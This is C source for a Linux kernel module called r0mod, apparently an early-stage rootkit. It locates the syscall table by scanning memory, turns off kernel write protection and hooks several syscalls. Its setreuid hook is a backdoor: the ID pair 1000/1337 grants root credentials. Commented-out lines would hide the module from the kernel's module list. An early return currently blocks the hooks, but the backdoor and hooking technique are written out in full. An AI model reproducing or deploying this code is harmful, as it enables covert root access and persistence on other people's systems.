#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>   // syscalls
#include <linux/syscalls.h> // syscalls

#include <asm/paravirt.h>   // write_cr0

#include <r0mod/global.h>

#define SEARCH_START    0x00000000
#define SEARCH_END      SEARCH_START + 0xc0000000

unsigned long *syscall_table;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1337))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

asmlinkage int (*orig_open)(const char *pathname, int flags);
asmlinkage int new_open(const char *pathname, int flags)
{
    return orig_open(pathname, flags);
}

asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
asmlinkage ssize_t new_read(int fd, void *buf, size_t count)
{
    return orig_read(fd, buf, count);
}

asmlinkage int (*orig_close)(int fd);
asmlinkage int new_close(int fd)
{
    return orig_close(fd);
}

asmlinkage int (*orig_fstat)(int fd, struct stat *buf);
asmlinkage int new_fstat(int fd, struct stat *buf)
{
    return orig_fstat(fd, buf);
}

unsigned long *find_sys_call_table(void)
{
    unsigned long i;

    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
    {
        unsigned long *sys_call_table = (unsigned long *)i;

        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
        {
            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
            return sys_call_table;
        }
    }

    return NULL;
}

static int __init r0mod_init(void)
{
    printk("Module starting...\n");

    //printk("Hiding module object.\n");
    //list_del_init(&__this_module.list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);

    printk("Search Start: %x\n", SEARCH_START);
    printk("Search End:   %x\n", SEARCH_END);

    //syscall_table = (void *)find_sys_call_table();
    if((syscall_table = (void *)find_sys_call_table()) == NULL)
    {
        printk("syscall_table == NULL\n");
        return -1;
    }

    printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);

    return -1;

    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)syscall_table[__NR_setreuid];
    syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;

    orig_open  = (void *)syscall_table[__NR_open];
    syscall_table[__NR_open] = (unsigned long)new_open;

    orig_close = (void *)syscall_table[__NR_close];
    syscall_table[__NR_close] = (unsigned long)new_close;

    orig_read  = (void *)syscall_table[__NR_read];
    syscall_table[__NR_read] = (unsigned long)new_read;

    orig_fstat = (void *)syscall_table[__NR_fstat];
    syscall_table[__NR_fstat] = (unsigned long)new_fstat;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...\n");

    if(syscall_table != NULL)
    {
        write_cr0(read_cr0() & (~0x10000));

        syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;
        syscall_table[__NR_open] = (unsigned long)orig_open;
        syscall_table[__NR_close] = (unsigned long)orig_close;
        syscall_table[__NR_read] = (unsigned long)orig_read;
        syscall_table[__NR_fstat] = (unsigned long)orig_fstat;

        write_cr0(read_cr0() | 0x10000);
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
